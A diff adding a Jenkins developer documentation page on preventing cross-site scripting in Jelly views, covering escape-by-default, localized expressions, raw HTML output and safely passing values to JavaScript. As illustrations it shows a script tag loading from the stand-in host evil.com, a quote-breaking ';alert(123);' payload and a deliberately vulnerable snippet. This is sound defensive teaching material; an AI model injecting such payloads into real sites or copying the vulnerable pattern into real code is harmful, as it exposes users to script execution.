@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<title>
+Preventing Cross-Site Scripting in Jelly views
+</title>
+<meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
+<meta content="Jenkins – an open source automation server which enables developers around the world to reliably build, test, and deploy their software" name="description">
+<meta charset="utf-8">
+<meta content="width=device-width, initial-scale=1" name="viewport">
+<meta content="ie=edge" http-equiv="x-ua-compatible">
+<link href="https://Vandit1604.github.io/jenkins.io/independent-scrolling-patch/doc/developer/security/xss-prevention/" rel="canonical">
+<!-- Favicons -->
+<link href="/favicon.ico" rel="shortcut icon" type="image/x-icon">
+<link href="/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180">
+<link href="/favicon-32x32.png" rel="icon" sizes="32x32" type="image/png">
+<link href="/favicon-16x16.png" rel="icon" sizes="16x16" type="image/png">
+<link href="/site.webmanifest" rel="manifest">
+<link color="#5bbad5" href="/safari-pinned-tab.svg" rel="mask-icon">
+<meta content="#2b5797" name="msapplication-TileColor">
+<meta content="#ffffff" name="theme-color">
+<meta content="Preventing Cross-Site Scripting in Jelly views" name="apple-mobile-web-app-title">
+<!-- Twitter Card data -->
+<meta content="summary_large_image" name="twitter:card">
+<meta content="@JenkinsCI" name="twitter:site">
+<meta content="Preventing Cross-Site Scripting in Jelly views" name="twitter:title">
+<meta content="Jenkins – an open source automation server which enables developers around the world to reliably build, test, and deploy their software" name="twitter:description">
+<meta content="@JenkinsCI" name="twitter:creator">
+<!-- Twitter Summary card images must be at least 120x120px -->
+<meta content="/jenkins.io/independent-scrolling-patch/images/logo-title-opengraph.png" name="twitter:image">
+<!-- Open Graph data -->
+<meta content="Preventing Cross-Site Scripting in Jelly views" property="og:title">
+<meta content="article" property="og:type">
+<meta content="https://Vandit1604.github.io/jenkins.io/independent-scrolling-patch/doc/developer/security/xss-prevention/" property="og:url">
+<meta content="Jenkins – an open source automation server which enables developers around the world to reliably build, test, and deploy their software" name="og:description">
+<meta content="Preventing Cross-Site Scripting in Jelly views" property="og:site_name">
+<meta content="/jenkins.io/independent-scrolling-patch/images/logo-title-opengraph.png" name="og:image">
+<link href="/jenkins.io/independent-scrolling-patch/assets/bower/bootstrap/css/bootstrap.min.css" media="screen" rel="stylesheet">
+<link href="/jenkins.io/independent-scrolling-patch/css/jenkins.css" media="screen" rel="stylesheet">
+<link href="/jenkins.io/independent-scrolling-patch/stylesheets/styles.css" media="screen" rel="stylesheet">
+<!-- Non-obtrusive CSS styles -->
+<link href="/jenkins.io/independent-scrolling-patch/css/footer.css" media="screen" rel="stylesheet">
+<link href="/jenkins.io/independent-scrolling-patch/css/font-awesome.min.css" media="screen" rel="stylesheet">
+<link href="https://cdn.jsdelivr.net/npm/@docsearch/css@3" rel="stylesheet">
+</head>
+<body>
+<script src="/jenkins.io/independent-scrolling-patch/assets/bower/jquery/jquery.min.js"></script>
+<!-- starting partial toptoolbar.html.haml -->
+<jio-navbar class="fixed-top" id="ji-toolbar" property="https://www.jenkins.io" showSearchBox=""></jio-navbar>
+<!-- Spacing to make the fixed-top sticky navbar not occlude any content below it -->
+<div class="pt-4">
+&nbsp;
+</div>
+
+<!-- ending partial toptoolbar.html.haml -->
+<style>
+  h4 {
+    font-size: 22px;
+  }
+  div.container .row.body {
+    margin-right: 1em;
+    margin-left: 1em;
+    padding-left: 0;
+    padding-right: 0;
+  }
+  .toc {
+      float: right;
+  }
+  div.sidebar-nav > ul {
+    list-style: none;
+    padding-inline-start: 2em;
+  }
+  ion-icon {
+    color: #bf6900;
+  }
+  .jenkins-developer-chapters {
+    list-style: none;
+    padding-inline-start: 0;
+    padding-left: 0;
+    padding-right: 0;
+  }
+  #dev-docs {
+    margin-bottom: 1em;
+  }
+  #reference-topics {
+    font-weight: normal;
+  }
+  #reference-topics:active {
+    font-weight: bold;
+  }
+  #taglibs {
+    margin-bottom: 2em;
+    font-weight: normal;
+  }
+  #taglibs:active {
+    font-weight: bold;
+  }
+  #how-to-guides {
+    font-weight: normal;
+  }
+  #how-to-guides:active {
+    font-weight: bold;
+  }
+  #plugin-tutorial {
+    font-weight: normal;
+  }
+  #plugin-tutorial:active {
+    font-weight: bold;
+  }
+  #javadoc {
+    font-weight: normal;
+  }
+  #javadoc:active {
+    font-weight: bold;
+  }
+</style>
+<!-- starting partial anchors.html.haml -->
+<script>
+  window.addEventListener('DOMContentLoaded', function () {
+    for (var i = 1 ; i <= 6 ; i ++) {
+      anchors.add('.container .row .col-8 h' + i);
+    }
+  })
+</script>
+
+<!-- ending partial anchors.html.haml -->
+<div class="container">
+<div class="row body flex-nowrap">
+<div class="col-4" id="sidebar-menu">
+<div class="sidebar-nav tour" id="sidebar-content">
+<p>
+<a href="/jenkins.io/independent-scrolling-patch/doc/developer/" class="">> Developer Documentation Home</a>
+</p>
+<h4 id="dev-docs">
+Developer Documentation
+</h4>
+<h5 id="plugin-tutorial">
+<a href="/jenkins.io/independent-scrolling-patch/doc/developer/tutorial/" class="">Plugin Tutorial</a>
+</h5>
+<h5 id="how-to-guides">
+<a href="/jenkins.io/independent-scrolling-patch/doc/developer/guides/" class="">How-To Guides</a>
+</h5>
+<h5 id="reference-topics">
+<a href="/jenkins.io/independent-scrolling-patch/doc/developer/book/" class="">Reference Topics</a>
+</h5>
+<ul>
+<li>
+<a href="/jenkins.io/independent-scrolling-patch/doc/developer/architecture/" class="">Architecture</a>
+<span title="Partial work in progress">
+<ion-icon name="warning" style="opacity: 0.5;"></ion-icon>
+</span>
+</li>
+<li>
+<a href="/jenkins.io/independent-scrolling-patch/doc/developer/initialization/" class="">Initialization and Startup</a>
+<span title="Partial work in progress">
+<ion-icon name="warning" style="opacity: 0.5;"></ion-icon>
+</span>
+</li>
+<li>
+<a href="/jenkins.io/independent-scrolling-patch/doc/developer/extensibility/" class="">Extensibility</a>
+<span title="Partial work in progress">
+<ion-icon name="warning" style="opacity: 0.5;"></ion-icon>
+</span>
+</li>
+<li>
+<a href="/jenkins.io/independent-scrolling-patch/doc/developer/model/" class="">Model</a>
+<span title="Partial work in progress">
+<ion-icon name="warning" style="opacity: 0.5;"></ion-icon>
+</span>
+</li>
+<li>
+<a href="/jenkins.io/independent-scrolling-patch/doc/developer/handling-requests/" class="">Handling Requests</a>
+<span title="Partial work in progress">
+<ion-icon name="warning" style="opacity: 0.5;"></ion-icon>
+</span>
+</li>
+<li>
+<a href="/jenkins.io/independent-scrolling-patch/doc/developer/security/" class="active">Security</a>
+<span title="Partial work in progress">
+<ion-icon name="warning" style="opacity: 0.5;"></ion-icon>
+</span>
+<small>
+<ul style="padding-left: 1rem;">
+<li>
+<a href="/jenkins.io/independent-scrolling-patch/doc/developer/security/secrets/" class="">Storing Secrets</a>
+</li>
+</ul>
+</small>
+</li>
+<li>
+<a href="/jenkins.io/independent-scrolling-patch/doc/developer/persistence/" class="">Persistent Objects</a>
+</li>
+<li>
+<a href="/jenkins.io/independent-scrolling-patch/doc/developer/scheduling/" class="">Scheduling</a>
+<span title="Early work in progress">
+<ion-icon name="warning" style="opacity: 0.5;"></ion-icon>
+</span>
+</li>
+<li>
+<a href="/jenkins.io/independent-scrolling-patch/doc/developer/views/" class="">Views</a>
+<span title="Partial work in progress">
+<ion-icon name="warning" style="opacity: 0.5;"></ion-icon>
+</span>
+</li>
+<li>
+<a href="/jenkins.io/independent-scrolling-patch/doc/developer/forms/" class="">Forms</a>
+</li>
+<li>
+<a href="/jenkins.io/independent-scrolling-patch/doc/developer/internationalization/" class="">Internationalization and Localization</a>
+<span title="Partial work in progress">
+<ion-icon name="warning" style="opacity: 0.5;"></ion-icon>
+</span>
+</li>
+<li>
+<a href="/jenkins.io/independent-scrolling-patch/doc/developer/distributed-builds/" class="">Distributed Builds</a>
+<span title="Partial work in progress">
+<ion-icon name="warning" style="opacity: 0.5;"></ion-icon>
+</span>
+</li>
+<li>
+<a href="/jenkins.io/independent-scrolling-patch/doc/developer/cli/" class="">Jenkins CLI</a>
+</li>
+<li>
+<a href="/jenkins.io/independent-scrolling-patch/doc/developer/testing/" class="">Testing</a>
+<span title="Partial work in progress">
+<ion-icon name="warning" style="opacity: 0.5;"></ion-icon>
+</span>
+</li>
+<li>
+<a href="/jenkins.io/independent-scrolling-patch/doc/developer/telemetry/" class="">Telemetry</a>
+</li>
+<li>
+<a href="/jenkins.io/independent-scrolling-patch/doc/developer/plugin-development/" class="">Plugin Development</a>
+</li>
+<li>
+<a href="/jenkins.io/independent-scrolling-patch/doc/developer/plugin-governance/" class="">Plugin Governance</a>
+</li>
+<li>
+<a href="/jenkins.io/independent-scrolling-patch/doc/developer/publishing/" class="">Publishing Plugins</a>
+</li>
+<li>
+<a href="/jenkins.io/independent-scrolling-patch/doc/developer/blueocean-plugin-development/" class="">Blue Ocean</a>
+<span title="Partial work in progress">
+<ion-icon name="warning" style="opacity: 0.5;"></ion-icon>
+</span>
+</li>
+<li>
+<a href="/jenkins.io/independent-scrolling-patch/doc/developer/building/" class="">Building and Debugging</a>
+<span title="Partial work in progress">
+<ion-icon name="warning" style="opacity: 0.5;"></ion-icon>
+</span>
+</li>
+<li>
+<a href="/jenkins.io/independent-scrolling-patch/doc/developer/development-environment/" class="">Development Environment</a>
+</li>
+<li>
+<a href="/jenkins.io/independent-scrolling-patch/doc/developer/crowdin/" class="">Jenkins Crowdin Integration</a>
+</li>
+<li>
+<a href="/jenkins.io/independent-scrolling-patch/doc/developer/tutorial-improve/" class="">Improve a Plugin Tutorial</a>
+</li>
+</ul>
+<h5>
+Resources
+</h5>
+<h6 style="padding-left: 2rem;">
+<a href="/jenkins.io/independent-scrolling-patch/doc/developer/extensions/" class="">Extensions Index</a>
+</h6>
+<h6 id="javadoc" style="padding-left: 2rem;">
+<a href="/jenkins.io/independent-scrolling-patch/doc/developer/javadoc/" class="">Javadoc</a>
+</h6>
+<h6 id="taglibs" style="padding-left: 2rem;">
+<a href="/jenkins.io/independent-scrolling-patch/doc/developer/development-environment/taglibs/" class="">Taglibs</a>
+</h6>
+<h5>
+Tools
+</h5>
+<ul>
+<li>
+<a href="https://jenkinsci.github.io/maven-hpi-plugin/" rel="noreferrer noopener" target="_blank">
+Maven HPI Plugin
+</a>
+</li>
+</ul>
+</div>
+</div>
+<div class="col-8">
+<h1>
+Preventing Cross-Site Scripting in Jelly views
+</h1>
+<div class="paragraph">
+<p>Cross-Site Scripting (XSS) is a web application vulnerability that allows users with the ability to control what gets shown to other users on a web page to run scripts in their browser.</p>
+</div>
+<div class="paragraph">
+<p>Jenkins displays content written by users with different levels of access in many different areas, and the Jelly files typically contain placeholders like this:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight nowrap"><code data-lang="xml"><span class="nt">&lt;h1&gt;</span>Project ${it.name}<span class="nt">&lt;/h1&gt;</span></code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>If <code>it.name</code> evaluates to a string containing HTML tags, those will be placed verbatim into the output, for example:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight nowrap"><code data-lang="html"><span class="nt">&lt;h1&gt;</span>Project <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"https://evil.com/exploit-jenkins.js"</span><span class="nt">&gt;&lt;/script&gt;</span>my java build<span class="nt">&lt;/h1&gt;</span></code></pre>
+</div>
+</div>
+<div class="admonitionblock note">
+<table>
+<tr>
+<td class="icon">
+<i class="fa icon-note" title="Note"></i>
+</td>
+<td class="content">
+In old versions of Jenkins, use of the <code>&lt;st:out&gt;</code> tag allowed escaping specific expressions.
+This document discusses the much safer escape by default approach (below).
+</td>
+</tr>
+</table>
+</div>
+<div class="sect2">
+<h3 id="escaping-by-default"><a class="anchor" href="#escaping-by-default"></a>Escaping by Default</h3>
+<div class="paragraph">
+<p>Since Jenkins 1.339, it is possible to instruct the Jelly processor to escape <code>${...}</code> expressions like the above by default.
+To do that, place the following XML processing instruction in the first line of the Jelly document:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight nowrap"><code data-lang="xml"><span class="cp">&lt;?jelly escape-by-default='true'?&gt;</span>
+<span class="c">&lt;!-- rest of the document here --&gt;</span></code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Note that this only affects the use of <code>${...}</code> among PCDATA, and not in attribute values, so that Jelly tag invocations don&#8217;t result in surprising behavior.</p>
+</div>
+<div class="sect3">
+<h4 id="keep-your-your-toolchain-updated"><a class="anchor" href="#keep-your-your-toolchain-updated"></a>Keep Your Your Toolchain Updated</h4>
+<div class="paragraph">
+<p>Since plugin POM 1.596, Jelly files are required to escape variables by default, and the build fails if such problems are found.
+Therefore it is strongly recommended to use at least that version of the plugin parent POM to prevent accidental XSS vulnerabilities.</p>
+</div>
+<div class="paragraph">
+<p>It&#8217;s recommended to always use the newest available 2.x or newer plugin parent POM.
+<a href="../../plugin-development/updating-parent">Learn more.</a></p>
+</div>
+</div>
+</div>
+<div class="sect2">
+<h3 id="escaping-and-localized-expressions"><a class="anchor" href="#escaping-and-localized-expressions"></a>Escaping and Localized Expressions</h3>
+<div class="paragraph">
+<p>Localized expressions of the form <code>${%expression}</code> are also affected by the above in the following ways:</p>
+</div>
+<div class="olist arabic">
+<ol class="arabic">
+<li>
+<p>The localized expression (read from a resource file) is not escaped, and allows inline HTML.</p>
+</li>
+<li>
+<p>Any arguments to the expression are escaped.</p>
+</li>
+</ol>
+</div>
+<div class="paragraph">
+<p>This means the following works as expected (rendering the <code>a</code> tag), and still prevents XSS problems in the user-specified name:</p>
+</div>
+<div class="listingblock">
+<div class="title">index.jelly</div>
+<div class="content">
+<pre class="rouge highlight nowrap"><code data-lang="xml"><span class="cp">&lt;?jelly escape-by-default='true'?&gt;</span>
+<span class="nt">&lt;p&gt;</span>${%blurb(it.displayName}<span class="nt">&lt;/p&gt;</span></code></pre>
+</div>
+</div>
+<div class="listingblock">
+<div class="title">index.properties</div>
+<div class="content">
+<pre class="rouge highlight nowrap"><code>blurb=&lt;a href="https://jenkins.io/"&gt;{0}&lt;/a&gt;</code></pre>
+</div>
+</div>
+</div>
+<div class="sect2">
+<h3 id="rendering-pre-escaped-content"><a class="anchor" href="#rendering-pre-escaped-content"></a>Rendering Pre-Escaped Content</h3>
+<div class="paragraph">
+<p>In rare cases, it might be necessary to render content that has previously been escaped or otherwise processed, without further escaping.
+A common reason to do this is to support formatting using the <a href="https://javadoc.jenkins.io/byShortName/MarkupFormatter" title="Javadoc for MarkupFormatter">markup formatter configured for the current Jenkins instance</a>, with might support a <a href="https://plugins.jenkins.io/antisamy-markup-formatter">safe subset of HTML</a>, or other markup languages, like <a href="https://plugins.jenkins.io/pegdown-formatter">Markdown</a>.
+In those cases, the security is controlled by the markup formatter.</p>
+</div>
+<div class="paragraph">
+<p>To do that, use the <code>&lt;j:out&gt;</code> Jelly tag:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight nowrap"><code data-lang="xml"><span class="cp">&lt;?jelly escape-by-default='true'?&gt;</span>
+<span class="nt">&lt;j:jelly</span> <span class="na">xmlns:j=</span><span class="s">"jelly:core"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;j:out</span> <span class="na">value=</span><span class="s">"${app.markupFormatter.translate(it.description)}"</span><span class="nt">/&gt;</span>
+<span class="nt">&lt;/j:jelly&gt;</span></code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>To pass arguments to localized expressions without escaping them in escaped-by-default Jelly files, wrap them in a call to <code>Functions#rawHtml</code>:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight nowrap"><code data-lang="xml"><span class="cp">&lt;?jelly escape-by-default='true'?&gt;</span>
+<span class="nt">&lt;j:jelly</span> <span class="na">xmlns:j=</span><span class="s">"jelly:core"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;h1&gt;</span>${%welcomeMessage(h.rawHtml(it.markupFormattedName)}<span class="nt">&lt;/h1&gt;</span>
+<span class="nt">&lt;/j:jelly&gt;</span></code></pre>
+</div>
+</div>
+<div class="admonitionblock warning">
+<table>
+<tr>
+<td class="icon">
+<i class="fa icon-warning" title="Warning"></i>
+</td>
+<td class="content">
+If the source of the argument to <code>j:out</code> or <code>Functions#rawHtml</code> isn&#8217;t completely trusted, these might result in an XSS vulnerability.
+</td>
+</tr>
+</table>
+</div>
+</div>
+<div class="sect2">
+<h3 id="passing-values-to-javascript"><a class="anchor" href="#passing-values-to-javascript"></a>Passing values to JavaScript</h3>
+<div class="sect3">
+<h4 id="the-bad-way"><a class="anchor" href="#the-bad-way"></a>The bad way</h4>
+<div class="paragraph">
+<p>In a situation where you need to pass information to JavaScript, you might inject the value directly inside the script like in the following snippet.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight nowrap"><code data-lang="xml"><span class="cp">&lt;?jelly escape-by-default='true'?&gt;</span>
+<span class="nt">&lt;j:jelly</span> <span class="na">xmlns:j=</span><span class="s">"jelly:core"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;h1&gt;</span>Random title<span class="nt">&lt;/h1&gt;</span>
+  <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"target-div"</span><span class="nt">&gt;&lt;/div&gt;</span>
+
+  <span class="nt">&lt;script&gt;</span>
+     var textToInsert = "${variableFromJava}";
+     document.querySelector('#target-div').innerText = textToInsert;
+  <span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;/j:jelly&gt;</span></code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>In this case, if the <code>variableFromJava</code> comes from an unsafe source, it could be used to create a cross-site scripting (XSS) attack.
+For example the following code will be executed: <code>";alert(123);"</code>.
+The JavaScript sent to the client will be:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight nowrap"><code data-lang="javascript"><span class="kd">var</span> <span class="nx">textToInsert</span> <span class="o">=</span> <span class="dl">""</span><span class="p">;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">123</span><span class="p">);</span><span class="dl">""</span><span class="p">;</span></code></pre>
+</div>
+</div>
+<div class="admonitionblock note">
+<table>
+<tr>
+<td class="icon">
+<i class="fa icon-note" title="Note"></i>
+</td>
+<td class="content">
+Within the payload, we close the existing double quote, then execute our code and finally open a double quote to match the existing one.
+That will result in a script without any format error.
+</td>
+</tr>
+</table>
+</div>
+</div>
+<div class="sect3">
+<h4 id="the-good-way"><a class="anchor" href="#the-good-way"></a>The good way</h4>
+<div class="paragraph">
+<p>If you need to pass a variable to your JavaScript, we strongly recommend to use this approach instead:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight nowrap"><code data-lang="xml"><span class="cp">&lt;?jelly escape-by-default='true'?&gt;</span>
+<span class="nt">&lt;j:jelly</span> <span class="na">xmlns:j=</span><span class="s">"jelly:core"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;h1&gt;</span>Random title<span class="nt">&lt;/h1&gt;</span>
+  <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"target-div"</span> <span class="na">data-inserted-from-java=</span><span class="s">"${variableFromJava}"</span><span class="nt">&gt;&lt;/div&gt;</span>
+
+  <span class="nt">&lt;script&gt;</span>
+     var targetDiv = document.querySelector('#target-div');
+     var textToInsert = targetDiv.getAttribute('data-inserted-from-java');
+     // equivalent of: targetDiv.dataset.insertedFromJava
+     targetDiv.innerText = textToInsert;
+  <span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;/j:jelly&gt;</span></code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>The use of the <code>data-*</code> attributes allow the developer either to use <code>getAttribute</code> or the <code>dataset</code> property,
+for more information see the <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes#attr-data-*">MDN documentation</a>.</p>
+</div>
+<div class="paragraph">
+<p>In this case you are taking advantage of the Jelly escape mechanism to ensure that the result is just a String.
+If we try to inject a <code>"</code>, it will be automatically converted to <code>&amp;quot;</code>.</p>
+</div>
+<div class="paragraph">
+<p>In the previous (vulnerable) example, the injected code was inside a context of "code to be interpreted".</p>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+
+<script src="/jenkins.io/independent-scrolling-patch/assets/bower/anchor-js/anchor.min.js"></script>
+<script src="/jenkins.io/independent-scrolling-patch/assets/bower/@popperjs/core/umd/popper.min.js"></script>
+<script src="/jenkins.io/independent-scrolling-patch/assets/bower/bootstrap/js/bootstrap.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/lit@2.5.0/polyfill-support.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@webcomponents/webcomponentsjs@2.6.0/webcomponents-loader.js"></script>
+<script data="ionicons" defer="" src="https://cdnjs.cloudflare.com/ajax/libs/ionicons/5.5.2/ionicons/ionicons.esm.js" type="module"></script>
+<script data="ionicons" defer="" nomodule="" src="https://cdnjs.cloudflare.com/ajax/libs/ionicons/5.5.2/ionicons/ionicons.js"></script>
+<script defer="" src="https://cdn.jsdelivr.net/npm/@jenkinsci/jenkins-io-components/+esm" type="module"></script>
+<script defer="" nomodule="" src="https://cdn.jsdelivr.net/npm/@jenkinsci/jenkins-io-components/"></script>
+<jio-footer githubBranch="master" githubRepo="jenkins-infra/jenkins.io" property="https://www.jenkins.io" sourcePath="content//doc/developer/security/xss-prevention.adoc"></jio-footer>
+<script>
+ (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+                    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+                    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+                    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+ 
+ga('create', 'UA-000000-0', 'auto');
+ga('send', 'pageview');
+ga('set', 'anonymizeIp', true);
+
+</script>
+
+<script>
+  $(function(){
+    var $body = $(document.body);
+    $body.on("keydown", function(){
+      $body.removeClass("no-outline");
+    })
+  })
+</script>
+<script src="https://cdn.jsdelivr.net/npm/@docsearch/js@3" type="text/javascript"></script>
+<script type="text/javascript">
+docsearch({
+  container: document.querySelector('input.searchbox').parentNode,
+  indexName: 'jenkins',
+  appId: "M6L7Q4Z8HS",
+  apiKey: "52f8dfbff76ffd9106f1c68fee16154b",
+  algoliaOptions: { 'facetFilters': ["tags:en"] },
+  debug: false
+});
+</script>
+</body>
+</html>
